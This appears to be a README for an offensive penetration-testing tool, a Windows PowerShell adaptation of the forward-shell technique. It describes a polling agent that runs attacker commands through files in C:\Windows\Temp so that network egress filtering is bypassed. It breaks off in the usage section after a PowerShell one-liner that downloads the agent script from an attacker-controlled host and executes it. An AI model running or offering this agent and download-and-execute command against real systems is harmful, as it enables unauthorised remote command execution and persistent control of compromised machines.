# Windows Forward Shell (PowerShell Agent)

This is a Windows adaptation of the **Forward Shell** concept popularized by [IppSec](https://github.com/IppSec/forward-shell). The original tool creates a shell on Linux that accepts commands via a named pipe (`mkfifo`) and writes output to a file, allowing command execution without a persistent network connection. This is ideal for environments with strict egress/ingress filtering that blocks reverse or bind shells.

Because Windows does not support `mkfifo` as a file-based pipe, this implementation uses a **polling agent** written in PowerShell. The agent runs on the target, checks a command file for new instructions, executes them, and appends the results to an output file. Your Python controller (adapted from the original `forward-shell.py`) writes commands to the command file and polls the output file via the existing web vulnerability.

## How It Works

1. **Target Preparation**: A small PowerShell agent (`agent.ps1`) is uploaded or executed on the Windows target through your initial access vector (e.g., a web shell, command injection, or deserialization vulnerability).
2. **Agent Loop**: The agent runs in an infinite loop:
   - Checks for the existence of a command file (e.g., `C:\Windows\Temp\fwd_cmd.txt`).
   - If found, reads the command, deletes the file (to mark it as consumed), executes the command via `cmd.exe`, and appends the output (including errors) to an output file (e.g., `C:\Windows\Temp\fwd_out.txt`).
   - Sleeps for a configurable interval (default 500ms).
3. **Controller (Python)**: Your modified `WebShell` class uses the web vulnerability to:
   - Write a Base64-encoded command to the command file.
   - Periodically read the output file and clear it after displaying the results.
   - Because the agent is polling, each command requires at least two HTTP requests (one to write, one to read).

## Usage

### 1. Deploy the Agent on the Target

You need a way to execute PowerShell on the target. For example, using a web vulnerability that allows command execution:

```cmd
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<ip or domain name>/agent.ps1')"
